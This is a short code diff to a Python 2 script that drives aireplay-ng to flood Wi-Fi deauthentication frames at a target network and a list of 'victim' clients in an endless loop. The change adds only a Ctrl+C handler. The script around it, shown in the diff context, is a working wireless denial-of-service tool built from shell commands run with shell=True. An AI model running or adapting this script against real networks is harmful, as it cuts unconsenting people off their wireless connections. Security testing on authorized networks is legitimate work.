@@ -1,5 +1,6 @@
 #! /usr/bin/env python
 import subprocess
+import signal
 import sys
 
 #Deauthenticate all clients (You should use aircrack-ng directly):
@@ -17,6 +18,10 @@ victims   = []
 
 interface = "wlan1mon"
 
+def signal_handler(signal, frame):
+        print('You pressed Ctrl+C!')
+        sys.exit(0)
+
 def deauth_all_clients(net):
     command = "aireplay-ng --deauth 0 -a {0} {1}".format(net, interface)
     print "[+] Deauthenticating all clients in the network"
@@ -29,7 +34,7 @@ def deauth_client(net, cli):
     subprocess.call([command], shell=True)
 
 if __name__ == '__main__':
-    #Init Message
+    signal.signal(signal.SIGINT, signal_handler)
     print "[+] Target Network:\n\t{0}".format(network)
 
     if len(victims) == 0:
@@ -39,7 +44,6 @@ if __name__ == '__main__':
     print "[+] Target Clients:"
     for i in range(0, len(victims)):
         print "\t{0}".format(victims[i])
-
     while True:
         for i in range(0, len(victims)):
             deauth_client(network, victims[i])
